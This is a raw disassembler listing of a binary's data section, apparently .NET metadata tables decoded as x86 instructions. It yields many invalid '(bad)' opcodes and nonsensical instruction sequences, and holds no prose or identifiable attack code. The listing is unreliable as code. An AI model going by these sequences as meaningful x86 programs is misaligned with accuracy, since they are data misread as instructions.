  4056c4:	00 00                	add    %al,(%eax)
  4056c6:	c6 00 3e             	movb   $0x3e,(%eax)
  4056c9:	0c 37                	or     $0x37,%al
  4056cb:	01 66 00             	add    %esp,0x0(%esi)
  4056ce:	d0 41 00             	rolb   $1,0x0(%ecx)
  4056d1:	00 00                	add    %al,(%eax)
  4056d3:	00 86 18 49 02 85    	add    %al,-0x7afdb6e8(%esi)
  4056d9:	02 67 00             	add    0x0(%edi),%ah
  4056dc:	1c 42                	sbb    $0x42,%al
  4056de:	00 00                	add    %al,(%eax)
  4056e0:	00 00                	add    %al,(%eax)
  4056e2:	c6                   	(bad)
  4056e3:	08 b4 0c 8d 02 69 00 	or     %dh,0x69028d(%esp,%ecx,1)
  4056ea:	56                   	push   %esi
  4056eb:	42                   	inc    %edx
  4056ec:	00 00                	add    %al,(%eax)
  4056ee:	00 00                	add    %al,(%eax)
  4056f0:	c6                   	(bad)
  4056f1:	08 d7                	or     %dl,%bh
  4056f3:	0c 96                	or     $0x96,%al
  4056f5:	02 69 00             	add    0x0(%ecx),%ch
  4056f8:	5e                   	pop    %esi
  4056f9:	42                   	inc    %edx
  4056fa:	00 00                	add    %al,(%eax)
  4056fc:	00 00                	add    %al,(%eax)
  4056fe:	c6                   	(bad)
  4056ff:	08 ea                	or     %ch,%dl
  405701:	0c 96                	or     $0x96,%al
  405703:	02 69 00             	add    0x0(%ecx),%ch
  405706:	66 42                	inc    %dx
  405708:	00 00                	add    %al,(%eax)
  40570a:	00 00                	add    %al,(%eax)
  40570c:	c6                   	(bad)
  40570d:	08 ff                	or     %bh,%bh
  40570f:	0c 9c                	or     $0x9c,%al
  405711:	02 69 00             	add    0x0(%ecx),%ch
  405714:	6e                   	outsb  %ds:(%esi),(%dx)
  405715:	42                   	inc    %edx
  405716:	00 00                	add    %al,(%eax)
  405718:	00 00                	add    %al,(%eax)
  40571a:	c6                   	(bad)
  40571b:	08 0e                	or     %cl,(%esi)
  40571d:	0d 33 01 69 00       	or     $0x690133,%eax
  405722:	75 42                	jne    0x405766
  405724:	00 00                	add    %al,(%eax)
  405726:	00 00                	add    %al,(%eax)
  405728:	c6                   	(bad)
  405729:	08 17                	or     %dl,(%edi)
  40572b:	0d a2 02 69 00       	or     $0x6902a2,%eax
  405730:	7d 42                	jge    0x405774
  405732:	00 00                	add    %al,(%eax)
  405734:	00 00                	add    %al,(%eax)
  405736:	c6                   	(bad)
  405737:	08 26                	or     %ah,(%esi)
  405739:	0d a7 02 69 00       	or     $0x6902a7,%eax
  40573e:	89 42 00             	mov    %eax,0x0(%edx)
  405741:	00 00                	add    %al,(%eax)
  405743:	00 c6                	add    %al,%dh
  405745:	00 32                	add    %dh,(%edx)
  405747:	0d 35 00 69 00       	or     $0x690035,%eax
  40574c:	8b 42 00             	mov    0x0(%edx),%eax
  40574f:	00 00                	add    %al,(%eax)
  405751:	00 c6                	add    %al,%dh
  405753:	00 44 0d 35          	add    %al,0x35(%ebp,%ecx,1)
  405757:	00 69 00             	add    %ch,0x0(%ecx)
  40575a:	8d 42 00             	lea    0x0(%edx),%eax
  40575d:	00 00                	add    %al,(%eax)
  40575f:	00 c6                	add    %al,%dh
  405761:	00 55 0d             	add    %dl,0xd(%ebp)
  405764:	35 00 69 00 8f       	xor    $0x8f006900,%eax
  405769:	42                   	inc    %edx
  40576a:	00 00                	add    %al,(%eax)
  40576c:	00 00                	add    %al,(%eax)
  40576e:	c6 00 6c             	movb   $0x6c,(%eax)
  405771:	0d 35 00 69 00       	or     $0x690035,%eax
  405776:	91                   	xchg   %eax,%ecx
  405777:	42                   	inc    %edx
  405778:	00 00                	add    %al,(%eax)
  40577a:	00 00                	add    %al,(%eax)
  40577c:	c6 00 81             	movb   $0x81,(%eax)
  40577f:	0d f0 00 69 00       	or     $0x6900f0,%eax
  405784:	ab                   	stos   %eax,%es:(%edi)
  405785:	42                   	inc    %edx
  405786:	00 00                	add    %al,(%eax)
  405788:	00 00                	add    %al,(%eax)
  40578a:	86 18                	xchg   %bl,(%eax)
  40578c:	49                   	dec    %ecx
  40578d:	02 c9                	add    %cl,%cl
  40578f:	02 6a 00             	add    0x0(%edx),%ch
  405792:	c8 42 00 00          	enter  $0x42,$0x0
  405796:	00 00                	add    %al,(%eax)
  405798:	86 08                	xchg   %cl,(%eax)
  40579a:	d2 0d cb 00 6b 00    	rorb   %cl,0x6b00cb
  4057a0:	d5 42                	aad    $0x42
  4057a2:	00 00                	add    %al,(%eax)
  4057a4:	00 00                	add    %al,(%eax)
  4057a6:	86 08                	xchg   %cl,(%eax)
  4057a8:	eb 0d                	jmp    0x4057b7
  4057aa:	d0 00                	rolb   $1,(%eax)
  4057ac:	6b 00 e3             	imul   $0xffffffe3,(%eax),%eax
  4057af:	42                   	inc    %edx
  4057b0:	00 00                	add    %al,(%eax)
  4057b2:	00 00                	add    %al,(%eax)
  4057b4:	86 08                	xchg   %cl,(%eax)
  4057b6:	04 0e                	add    $0xe,%al
  4057b8:	cb                   	lret
  4057b9:	00 6c 00 f0          	add    %ch,-0x10(%eax,%eax,1)
  4057bd:	42                   	inc    %edx
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	00 00                	add    %al,(%eax)
  4057c2:	86 08                	xchg   %cl,(%eax)
  4057c4:	1d 0e d0 00 6c       	sbb    $0x6c00d00e,%eax
  4057c9:	00 fe                	add    %bh,%dh
  4057cb:	42                   	inc    %edx
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	00 00                	add    %al,(%eax)
  4057d0:	86 08                	xchg   %cl,(%eax)
  4057d2:	36 0e                	ss push %cs
  4057d4:	cb                   	lret
  4057d5:	00 6d 00             	add    %ch,0x0(%ebp)
  4057d8:	0b 43 00             	or     0x0(%ebx),%eax
  4057db:	00 00                	add    %al,(%eax)
  4057dd:	00 86 08 51 0e d0    	add    %al,-0x2ff1aef8(%esi)
  4057e3:	00 6d 00             	add    %ch,0x0(%ebp)
  4057e6:	19 43 00             	sbb    %eax,0x0(%ebx)
  4057e9:	00 00                	add    %al,(%eax)
  4057eb:	00 86 08 6c 0e cb    	add    %al,-0x34f193f8(%esi)
  4057f1:	00 6e 00             	add    %ch,0x0(%esi)
  4057f4:	26 43                	es inc %ebx
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	00 00                	add    %al,(%eax)
  4057fa:	86 08                	xchg   %cl,(%eax)
  4057fc:	87 0e                	xchg   %ecx,(%esi)
  4057fe:	d0 00                	rolb   $1,(%eax)
  405800:	6e                   	outsb  %ds:(%esi),(%dx)
  405801:	00 34 43             	add    %dh,(%ebx,%eax,2)
  405804:	00 00                	add    %al,(%eax)
  405806:	00 00                	add    %al,(%eax)
  405808:	86 08                	xchg   %cl,(%eax)
  40580a:	a2 0e cb 00 6f       	mov    %al,0x6f00cb0e
  40580f:	00 41 43             	add    %al,0x43(%ecx)
  405812:	00 00                	add    %al,(%eax)
  405814:	00 00                	add    %al,(%eax)
  405816:	86 08                	xchg   %cl,(%eax)
  405818:	bb 0e d0 00 6f       	mov    $0x6f00d00e,%ebx
  40581d:	00 4f 43             	add    %cl,0x43(%edi)
  405820:	00 00                	add    %al,(%eax)
  405822:	00 00                	add    %al,(%eax)
  405824:	86 08                	xchg   %cl,(%eax)
  405826:	d4 0e                	aam    $0xe
  405828:	cb                   	lret
  405829:	00 70 00             	add    %dh,0x0(%eax)
  40582c:	5c                   	pop    %esp
  40582d:	43                   	inc    %ebx
  40582e:	00 00                	add    %al,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	86 08                	xchg   %cl,(%eax)
  405834:	ed                   	in     (%dx),%eax
  405835:	0e                   	push   %cs
  405836:	d0 00                	rolb   $1,(%eax)
  405838:	70 00                	jo     0x40583a
  40583a:	6a 43                	push   $0x43
  40583c:	00 00                	add    %al,(%eax)
  40583e:	00 00                	add    %al,(%eax)
  405840:	86 08                	xchg   %cl,(%eax)
  405842:	06                   	push   %es
  405843:	0f cb                	bswap  %ebx
  405845:	00 71 00             	add    %dh,0x0(%ecx)
  405848:	77 43                	ja     0x40588d
  40584a:	00 00                	add    %al,(%eax)
  40584c:	00 00                	add    %al,(%eax)
  40584e:	86 08                	xchg   %cl,(%eax)
  405850:	21 0f                	and    %ecx,(%edi)
  405852:	d0 00                	rolb   $1,(%eax)
  405854:	71 00                	jno    0x405856
  405856:	85 43 00             	test   %eax,0x0(%ebx)
  405859:	00 00                	add    %al,(%eax)
  40585b:	00 86 08 3c 0f cb    	add    %al,-0x34f0c3f8(%esi)
  405861:	00 72 00             	add    %dh,0x0(%edx)
  405864:	92                   	xchg   %eax,%edx
  405865:	43                   	inc    %ebx
  405866:	00 00                	add    %al,(%eax)
  405868:	00 00                	add    %al,(%eax)
  40586a:	86 08                	xchg   %cl,(%eax)
  40586c:	57                   	push   %edi
  40586d:	0f d0                	(bad)
  40586f:	00 72 00             	add    %dh,0x0(%edx)
  405872:	a0 43 00 00 00       	mov    0x43,%al
  405877:	00 86 08 72 0f cb    	add    %al,-0x34f08df8(%esi)
  40587d:	00 73 00             	add    %dh,0x0(%ebx)
  405880:	ad                   	lods   %ds:(%esi),%eax
  405881:	43                   	inc    %ebx
  405882:	00 00                	add    %al,(%eax)
  405884:	00 00                	add    %al,(%eax)
  405886:	86 08                	xchg   %cl,(%eax)
  405888:	8e 0f                	mov    (%edi),%cs
  40588a:	d0 00                	rolb   $1,(%eax)
  40588c:	73 00                	jae    0x40588e
  40588e:	bb 43 00 00 00       	mov    $0x43,%ebx
  405893:	00 86 08 aa 0f cb    	add    %al,-0x34f055f8(%esi)
  405899:	00 74 00 c8          	add    %dh,-0x38(%eax,%eax,1)
  40589d:	43                   	inc    %ebx
  40589e:	00 00                	add    %al,(%eax)
  4058a0:	00 00                	add    %al,(%eax)
  4058a2:	86 08                	xchg   %cl,(%eax)
  4058a4:	c6                   	(bad)
  4058a5:	0f d0                	(bad)
  4058a7:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  4058ab:	00 00                	add    %al,(%eax)
  4058ad:	00 00                	add    %al,(%eax)
  4058af:	00 c6                	add    %al,%dh
  4058b1:	0d e2 0f 06 01       	or     $0x1060fe2,%eax
  4058b6:	75 00                	jne    0x4058b8
  4058b8:	00 00                	add    %al,(%eax)
  4058ba:	00 00                	add    %al,(%eax)
  4058bc:	00 00                	add    %al,(%eax)
  4058be:	c6                   	(bad)
  4058bf:	0d f1 0f cf 02       	or     $0x2cf0ff1,%eax
  4058c4:	75 00                	jne    0x4058c6
  4058c6:	00 00                	add    %al,(%eax)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	00 00                	add    %al,(%eax)
  4058cc:	c6                   	(bad)
  4058cd:	0d 00 10 ec 00       	or     $0xec1000,%eax
  4058d2:	76 00                	jbe    0x4058d4
  4058d4:	00 00                	add    %al,(%eax)
  4058d6:	00 00                	add    %al,(%eax)
  4058d8:	00 00                	add    %al,(%eax)
  4058da:	c6                   	(bad)
  4058db:	0d 0d 10 f0 00       	or     $0xf0100d,%eax
  4058e0:	76 00                	jbe    0x4058e2
  4058e2:	d6                   	salc
  4058e3:	43                   	inc    %ebx
  4058e4:	00 00                	add    %al,(%eax)
  4058e6:	00 00                	add    %al,(%eax)
  4058e8:	e6 09                	out    %al,$0x9
  4058ea:	e2 0f                	loop   0x4058fb
  4058ec:	06                   	push   %es
  4058ed:	01 77 00             	add    %esi,0x0(%edi)
  4058f0:	de 43 00             	fiadds 0x0(%ebx)
  4058f3:	00 00                	add    %al,(%eax)
  4058f5:	00 e6                	add    %ah,%dh
  4058f7:	09 f1                	or     %esi,%ecx
  4058f9:	0f cf                	bswap  %edi
  4058fb:	02 77 00             	add    0x0(%edi),%dh
  4058fe:	e7 43                	out    %eax,$0x43
  405900:	00 00                	add    %al,(%eax)
  405902:	00 00                	add    %al,(%eax)
  405904:	e6 09                	out    %al,$0x9
  405906:	00 10                	add    %dl,(%eax)
  405908:	ec                   	in     (%dx),%al
  405909:	00 78 00             	add    %bh,0x0(%eax)
  40590c:	ef                   	out    %eax,(%dx)
  40590d:	43                   	inc    %ebx
  40590e:	00 00                	add    %al,(%eax)
  405910:	00 00                	add    %al,(%eax)
  405912:	e6 09                	out    %al,$0x9
  405914:	0d 10 f0 00 78       	or     $0x7800f010,%eax
  405919:	00 64 44 00          	add    %ah,0x0(%esp,%eax,2)
  40591d:	00 00                	add    %al,(%eax)
  40591f:	00 91 00 42 10 d4    	add    %dl,-0x2befbe00(%ecx)
  405925:	02 79 00             	add    0x0(%ecx),%bh
  405928:	ec                   	in     (%dx),%al
  405929:	49                   	dec    %ecx
  40592a:	00 00                	add    %al,(%eax)
  40592c:	00 00                	add    %al,(%eax)
  40592e:	91                   	xchg   %eax,%ecx
  40592f:	00 63 10             	add    %ah,0x10(%ebx)
  405932:	da 02                	fiaddl (%edx)
  405934:	7a 00                	jp     0x405936
  405936:	07                   	pop    %es
  405937:	4a                   	dec    %edx
  405938:	00 00                	add    %al,(%eax)
  40593a:	00 00                	add    %al,(%eax)
  40593c:	86 18                	xchg   %bl,(%eax)
  40593e:	49                   	dec    %ecx
  40593f:	02 35 00 7c 00 f8    	add    0xf8007c00,%dh
  405945:	43                   	inc    %ebx
  405946:	00 00                	add    %al,(%eax)
  405948:	00 00                	add    %al,(%eax)
  40594a:	86 18                	xchg   %bl,(%eax)
  40594c:	49                   	dec    %ecx
  40594d:	02 35 00 7c 00 00    	add    0x7c00,%dh
  405953:	44                   	inc    %esp
  405954:	00 00                	add    %al,(%eax)
  405956:	00 00                	add    %al,(%eax)
  405958:	86 00                	xchg   %al,(%eax)
  40595a:	75 1e                	jne    0x40597a
  40595c:	86 06                	xchg   %al,(%esi)
  40595e:	7c 00                	jl     0x405960
  405960:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405964:	00 00                	add    %al,(%eax)
  405966:	86 00                	xchg   %al,(%eax)
  405968:	80 1e 86             	sbbb   $0x86,(%esi)
  40596b:	06                   	push   %es
  40596c:	7e 00                	jle    0x40596e
  40596e:	4b                   	dec    %ebx
  40596f:	44                   	inc    %esp
  405970:	00 00                	add    %al,(%eax)
  405972:	00 00                	add    %al,(%eax)
  405974:	86 00                	xchg   %al,(%eax)
  405976:	98                   	cwtl
  405977:	1e                   	push   %ds
  405978:	8e 06                	mov    (%esi),%es
  40597a:	80 00 00             	addb   $0x0,(%eax)
  40597d:	00 01                	add    %al,(%ecx)
  40597f:	00 84 10 00 00 02 00 	add    %al,0x20000(%eax,%edx,1)
  405986:	8d 10                	lea    (%eax),%edx
  405988:	00 00                	add    %al,(%eax)
  40598a:	03 00                	add    (%eax),%eax
  40598c:	98                   	cwtl
  40598d:	10 00                	adc    %al,(%eax)
  40598f:	00 04 00             	add    %al,(%eax,%eax,1)
  405992:	a2 10 00 00 05       	mov    %al,0x5000010
  405997:	00 a9 10 00 00 06    	add    %ch,0x6000010(%ecx)
  40599d:	00 b2 10 00 00 07    	add    %dh,0x7000010(%edx)
  4059a3:	00 be 10 00 00 08    	add    %bh,0x8000010(%esi)
  4059a9:	00 c7                	add    %al,%bh
  4059ab:	10 00                	adc    %al,(%eax)
  4059ad:	20 09                	and    %cl,(%ecx)
  4059af:	00 d3                	add    %dl,%bl
  4059b1:	10 00                	adc    %al,(%eax)
  4059b3:	00 0a                	add    %cl,(%edx)
  4059b5:	00 1a                	add    %bl,(%edx)
  4059b7:	11 00                	adc    %eax,(%eax)
  4059b9:	00 01                	add    %al,(%ecx)
  4059bb:	00 20                	add    %ah,(%eax)
  4059bd:	11 00                	adc    %eax,(%eax)
  4059bf:	00 02                	add    %al,(%edx)
  4059c1:	00 28                	add    %ch,(%eax)
  4059c3:	11 00                	adc    %eax,(%eax)
  4059c5:	00 03                	add    %al,(%ebx)
  4059c7:	00 30                	add    %dh,(%eax)
  4059c9:	11 00                	adc    %eax,(%eax)
  4059cb:	00 04 00             	add    %al,(%eax,%eax,1)
  4059ce:	37                   	aaa
  4059cf:	11 00                	adc    %eax,(%eax)
  4059d1:	00 05 00 3c 11 00    	add    %al,0x113c00
  4059d7:	00 06                	add    %al,(%esi)
  4059d9:	00 46 11             	add    %al,0x11(%esi)
  4059dc:	00 00                	add    %al,(%eax)
  4059de:	01 00                	add    %eax,(%eax)
  4059e0:	4e                   	dec    %esi
  4059e1:	11 00                	adc    %eax,(%eax)
  4059e3:	00 01                	add    %al,(%ecx)
  4059e5:	00 4e 11             	add    %cl,0x11(%esi)
  4059e8:	00 00                	add    %al,(%eax)
  4059ea:	01 00                	add    %eax,(%eax)
  4059ec:	4e                   	dec    %esi
  4059ed:	11 00                	adc    %eax,(%eax)
  4059ef:	00 01                	add    %al,(%ecx)
  4059f1:	00 4e 11             	add    %cl,0x11(%esi)
  4059f4:	00 00                	add    %al,(%eax)
  4059f6:	01 00                	add    %eax,(%eax)
  4059f8:	4e                   	dec    %esi
  4059f9:	11 00                	adc    %eax,(%eax)
  4059fb:	00 01                	add    %al,(%ecx)
  4059fd:	00 54 11 00          	add    %dl,0x0(%ecx,%edx,1)
  405a01:	00 01                	add    %al,(%ecx)
  405a03:	00 46 11             	add    %al,0x11(%esi)
  405a06:	00 00                	add    %al,(%eax)
  405a08:	01 00                	add    %eax,(%eax)
  405a0a:	5e                   	pop    %esi
  405a0b:	11 00                	adc    %eax,(%eax)
  405a0d:	00 02                	add    %al,(%edx)
  405a0f:	00 65 11             	add    %ah,0x11(%ebp)
  405a12:	00 00                	add    %al,(%eax)
  405a14:	03 00                	add    (%eax),%eax
  405a16:	71 11                	jno    0x405a29
  405a18:	00 00                	add    %al,(%eax)
  405a1a:	04 00                	add    $0x0,%al
  405a1c:	76 11                	jbe    0x405a2f
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	01 00                	add    %eax,(%eax)
  405a22:	54                   	push   %esp
  405a23:	11 00                	adc    %eax,(%eax)
  405a25:	00 02                	add    %al,(%edx)
  405a27:	00 76 11             	add    %dh,0x11(%esi)
  405a2a:	00 00                	add    %al,(%eax)
  405a2c:	01 00                	add    %eax,(%eax)
  405a2e:	7b 11                	jnp    0x405a41
  405a30:	00 00                	add    %al,(%eax)
  405a32:	02 00                	add    (%eax),%al
  405a34:	82 11 00             	adcb   $0x0,(%ecx)
  405a37:	00 01                	add    %al,(%ecx)
  405a39:	00 4e 11             	add    %cl,0x11(%esi)
  405a3c:	00 00                	add    %al,(%eax)
  405a3e:	01 00                	add    %eax,(%eax)
  405a40:	4e                   	dec    %esi
  405a41:	11 00                	adc    %eax,(%eax)
  405a43:	00 01                	add    %al,(%ecx)
  405a45:	00 4e 11             	add    %cl,0x11(%esi)
  405a48:	00 00                	add    %al,(%eax)
  405a4a:	01 00                	add    %eax,(%eax)
  405a4c:	8b 11                	mov    (%ecx),%edx
  405a4e:	00 00                	add    %al,(%eax)
  405a50:	01 00                	add    %eax,(%eax)
  405a52:	91                   	xchg   %eax,%ecx
  405a53:	11 00                	adc    %eax,(%eax)
  405a55:	00 02                	add    %al,(%edx)
  405a57:	00 9a 11 00 00 03    	add    %bl,0x3000011(%edx)
  405a5d:	00 a4 11 00 00 04 00 	add    %ah,0x40000(%ecx,%edx,1)
  405a64:	ab                   	stos   %eax,%es:(%edi)
  405a65:	11 00                	adc    %eax,(%eax)
  405a67:	00 01                	add    %al,(%ecx)
  405a69:	00 91 11 00 00 02    	add    %dl,0x2000011(%ecx)
  405a6f:	00 9a 11 00 00 03    	add    %bl,0x3000011(%edx)
  405a75:	00 a4 11 00 00 01 00 	add    %ah,0x10000(%ecx,%edx,1)
  405a7c:	b4 11                	mov    $0x11,%ah
  405a7e:	00 00                	add    %al,(%eax)
  405a80:	02 00                	add    (%eax),%al
  405a82:	be 11 00 00 03       	mov    $0x3000011,%esi
  405a87:	00 91 11 00 00 04    	add    %dl,0x4000011(%ecx)
  405a8d:	00 9a 11 00 00 01    	add    %bl,0x1000011(%edx)
  405a93:	00 c9                	add    %cl,%cl
  405a95:	11 00                	adc    %eax,(%eax)
  405a97:	00 02                	add    %al,(%edx)
  405a99:	00 d2                	add    %dl,%dl
  405a9b:	11 00                	adc    %eax,(%eax)
  405a9d:	00 03                	add    %al,(%ebx)
  405a9f:	00 dc                	add    %bl,%ah
  405aa1:	11 02                	adc    %eax,(%edx)
  405aa3:	20 04 00             	and    %al,(%eax,%eax,1)
  405aa6:	e7 11                	out    %eax,$0x11
  405aa8:	00 00                	add    %al,(%eax)
  405aaa:	05 00 fd 11 00       	add    $0x11fd00,%eax
  405aaf:	00 06                	add    %al,(%esi)
  405ab1:	00 05 12 00 00 01    	add    %al,0x1000012
  405ab7:	00 0c 12             	add    %cl,(%edx,%edx,1)
  405aba:	00 00                	add    %al,(%eax)
  405abc:	02 00                	add    (%eax),%al
  405abe:	11 12                	adc    %edx,(%edx)
  405ac0:	00 00                	add    %al,(%eax)
  405ac2:	03 00                	add    (%eax),%eax
  405ac4:	19 12                	sbb    %edx,(%edx)
  405ac6:	00 00                	add    %al,(%eax)
  405ac8:	01 00                	add    %eax,(%eax)
  405aca:	91                   	xchg   %eax,%ecx
  405acb:	11 00                	adc    %eax,(%eax)
  405acd:	00 02                	add    %al,(%edx)
  405acf:	00 9a 11 00 00 03    	add    %bl,0x3000011(%edx)
  405ad5:	00 21                	add    %ah,(%ecx)
  405ad7:	12 00                	adc    (%eax),%al
  405ad9:	00 01                	add    %al,(%ecx)
  405adb:	00 32                	add    %dh,(%edx)
  405add:	12 00                	adc    (%eax),%al
  405adf:	00 02                	add    %al,(%edx)
  405ae1:	00 39                	add    %bh,(%ecx)
  405ae3:	12 00                	adc    (%eax),%al
  405ae5:	00 01                	add    %al,(%ecx)
  405ae7:	00 32                	add    %dh,(%edx)
  405ae9:	12 00                	adc    (%eax),%al
  405aeb:	00 02                	add    %al,(%edx)
  405aed:	00 39                	add    %bh,(%ecx)
  405aef:	12 00                	adc    (%eax),%al
  405af1:	00 01                	add    %al,(%ecx)
  405af3:	00 3b                	add    %bh,(%ebx)
  405af5:	12 00                	adc    (%eax),%al
  405af7:	00 01                	add    %al,(%ecx)
  405af9:	00 5e 11             	add    %bl,0x11(%esi)
  405afc:	00 00                	add    %al,(%eax)
  405afe:	02 00                	add    (%eax),%al
  405b00:	39 12                	cmp    %edx,(%edx)
  405b02:	00 00                	add    %al,(%eax)
  405b04:	01 00                	add    %eax,(%eax)
  405b06:	41                   	inc    %ecx
  405b07:	12 00                	adc    (%eax),%al
  405b09:	00 02                	add    %al,(%edx)
  405b0b:	00 44 12 00          	add    %al,0x0(%edx,%edx,1)
  405b0f:	00 01                	add    %al,(%ecx)
  405b11:	00 4d 12             	add    %cl,0x12(%ebp)
  405b14:	00 00                	add    %al,(%eax)
  405b16:	01 00                	add    %eax,(%eax)
  405b18:	56                   	push   %esi
  405b19:	12 00                	adc    (%eax),%al
  405b1b:	00 01                	add    %al,(%ecx)
  405b1d:	00 60 12             	add    %ah,0x12(%eax)
  405b20:	00 00                	add    %al,(%eax)
  405b22:	01 00                	add    %eax,(%eax)
  405b24:	6a 12                	push   $0x12
  405b26:	00 00                	add    %al,(%eax)
  405b28:	01 00                	add    %eax,(%eax)
  405b2a:	20 11                	and    %dl,(%ecx)
  405b2c:	00 00                	add    %al,(%eax)
  405b2e:	02 00                	add    (%eax),%al
  405b30:	28 11                	sub    %dl,(%ecx)
  405b32:	00 00                	add    %al,(%eax)
  405b34:	03 00                	add    (%eax),%eax
  405b36:	70 12                	jo     0x405b4a
  405b38:	00 00                	add    %al,(%eax)
  405b3a:	01 00                	add    %eax,(%eax)
  405b3c:	20 11                	and    %dl,(%ecx)
  405b3e:	00 00                	add    %al,(%eax)
  405b40:	02 00                	add    (%eax),%al
  405b42:	28 11                	sub    %dl,(%ecx)
  405b44:	00 00                	add    %al,(%eax)
  405b46:	03 00                	add    (%eax),%eax
  405b48:	7d 12                	jge    0x405b5c
  405b4a:	00 00                	add    %al,(%eax)
  405b4c:	04 00                	add    $0x0,%al
  405b4e:	85 12                	test   %edx,(%edx)
  405b50:	00 00                	add    %al,(%eax)
  405b52:	01 00                	add    %eax,(%eax)
  405b54:	20 11                	and    %dl,(%ecx)
  405b56:	00 00                	add    %al,(%eax)
  405b58:	02 00                	add    (%eax),%al
  405b5a:	28 11                	sub    %dl,(%ecx)
  405b5c:	00 00                	add    %al,(%eax)
  405b5e:	03 00                	add    (%eax),%eax
  405b60:	a9 10 00 00 04       	test   $0x4000010,%eax
  405b65:	00 8d 10 00 00 05    	add    %cl,0x5000010(%ebp)
  405b6b:	00 93 12 00 00 06    	add    %dl,0x6000012(%ebx)
  405b71:	00 46 11             	add    %al,0x11(%esi)
  405b74:	00 00                	add    %al,(%eax)
  405b76:	01 00                	add    %eax,(%eax)
  405b78:	20 11                	and    %dl,(%ecx)
  405b7a:	00 00                	add    %al,(%eax)
  405b7c:	02 00                	add    (%eax),%al
  405b7e:	28 11                	sub    %dl,(%ecx)
  405b80:	00 00                	add    %al,(%eax)
  405b82:	03 00                	add    (%eax),%eax
  405b84:	a9 10 00 00 04       	test   $0x4000010,%eax
  405b89:	00 8d 10 00 00 01    	add    %cl,0x1000010(%ebp)
  405b8f:	00 aa 12 00 00 02    	add    %ch,0x2000012(%edx)
  405b95:	00 ba 12 00 00 03    	add    %bh,0x3000012(%edx)
  405b9b:	00 4e 11             	add    %cl,0x11(%esi)
  405b9e:	00 00                	add    %al,(%eax)
  405ba0:	01 00                	add    %eax,(%eax)
  405ba2:	4e                   	dec    %esi
  405ba3:	11 00                	adc    %eax,(%eax)
  405ba5:	00 01                	add    %al,(%ecx)
  405ba7:	00 28                	add    %ch,(%eax)
  405ba9:	11 00                	adc    %eax,(%eax)
  405bab:	00 01                	add    %al,(%ecx)
  405bad:	00 4e 11             	add    %cl,0x11(%esi)
  405bb0:	00 00                	add    %al,(%eax)
  405bb2:	01 00                	add    %eax,(%eax)
  405bb4:	aa                   	stos   %al,%es:(%edi)
  405bb5:	12 00                	adc    (%eax),%al
  405bb7:	00 02                	add    %al,(%edx)
  405bb9:	00 ba 12 00 00 03    	add    %bh,0x3000012(%edx)
  405bbf:	00 4e 11             	add    %cl,0x11(%esi)
  405bc2:	00 00                	add    %al,(%eax)
  405bc4:	01 00                	add    %eax,(%eax)
  405bc6:	4e                   	dec    %esi
  405bc7:	11 00                	adc    %eax,(%eax)
  405bc9:	00 01                	add    %al,(%ecx)
  405bcb:	00 ca                	add    %cl,%dl
  405bcd:	12 00                	adc    (%eax),%al
  405bcf:	00 02                	add    %al,(%edx)
  405bd1:	00 d3                	add    %dl,%bl
  405bd3:	12 00                	adc    (%eax),%al
  405bd5:	00 01                	add    %al,(%ecx)
  405bd7:	00 28                	add    %ch,(%eax)
  405bd9:	11 00                	adc    %eax,(%eax)
  405bdb:	00 01                	add    %al,(%ecx)
  405bdd:	00 28                	add    %ch,(%eax)
  405bdf:	11 00                	adc    %eax,(%eax)
  405be1:	00 01                	add    %al,(%ecx)
  405be3:	00 da                	add    %bl,%dl
  405be5:	12 00                	adc    (%eax),%al
  405be7:	00 02                	add    %al,(%edx)
  405be9:	00 5c 0c 00          	add    %bl,0x0(%esp,%ecx,1)
  405bed:	00 01                	add    %al,(%ecx)
  405bef:	00 39                	add    %bh,(%ecx)
  405bf1:	10 00                	adc    %al,(%eax)
  405bf3:	00 01                	add    %al,(%ecx)
  405bf5:	00 5c 0c 00          	add    %bl,0x0(%esp,%ecx,1)
  405bf9:	00 01                	add    %al,(%ecx)
  405bfb:	00 4e 11             	add    %cl,0x11(%esi)
  405bfe:	00 00                	add    %al,(%eax)
  405c00:	01 00                	add    %eax,(%eax)
  405c02:	4e                   	dec    %esi
  405c03:	11 00                	adc    %eax,(%eax)
  405c05:	00 01                	add    %al,(%ecx)
  405c07:	00 4e 11             	add    %cl,0x11(%esi)
  405c0a:	00 00                	add    %al,(%eax)
  405c0c:	01 00                	add    %eax,(%eax)
  405c0e:	4e                   	dec    %esi
  405c0f:	11 00                	adc    %eax,(%eax)
  405c11:	00 01                	add    %al,(%ecx)
  405c13:	00 4e 11             	add    %cl,0x11(%esi)
  405c16:	00 00                	add    %al,(%eax)
  405c18:	01 00                	add    %eax,(%eax)
  405c1a:	4e                   	dec    %esi
  405c1b:	11 00                	adc    %eax,(%eax)
  405c1d:	00 01                	add    %al,(%ecx)
  405c1f:	00 4e 11             	add    %cl,0x11(%esi)
  405c22:	00 00                	add    %al,(%eax)
  405c24:	01 00                	add    %eax,(%eax)
  405c26:	4e                   	dec    %esi
  405c27:	11 00                	adc    %eax,(%eax)
  405c29:	00 01                	add    %al,(%ecx)
  405c2b:	00 4e 11             	add    %cl,0x11(%esi)
  405c2e:	00 00                	add    %al,(%eax)
  405c30:	01 00                	add    %eax,(%eax)
  405c32:	4e                   	dec    %esi
  405c33:	11 00                	adc    %eax,(%eax)
  405c35:	00 01                	add    %al,(%ecx)
  405c37:	00 4e 11             	add    %cl,0x11(%esi)
  405c3a:	00 00                	add    %al,(%eax)
  405c3c:	01 00                	add    %eax,(%eax)
  405c3e:	4e                   	dec    %esi
  405c3f:	11 00                	adc    %eax,(%eax)
  405c41:	00 01                	add    %al,(%ecx)
  405c43:	00 4e 11             	add    %cl,0x11(%esi)
  405c46:	00 00                	add    %al,(%eax)
  405c48:	01 00                	add    %eax,(%eax)
  405c4a:	4e                   	dec    %esi
  405c4b:	11 00                	adc    %eax,(%eax)
  405c4d:	00 01                	add    %al,(%ecx)
  405c4f:	00 de                	add    %bl,%dh
  405c51:	12 00                	adc    (%eax),%al
  405c53:	00 01                	add    %al,(%ecx)
  405c55:	00 32                	add    %dh,(%edx)
  405c57:	12 00                	adc    (%eax),%al
  405c59:	00 02                	add    %al,(%edx)
  405c5b:	00 39                	add    %bh,(%ecx)
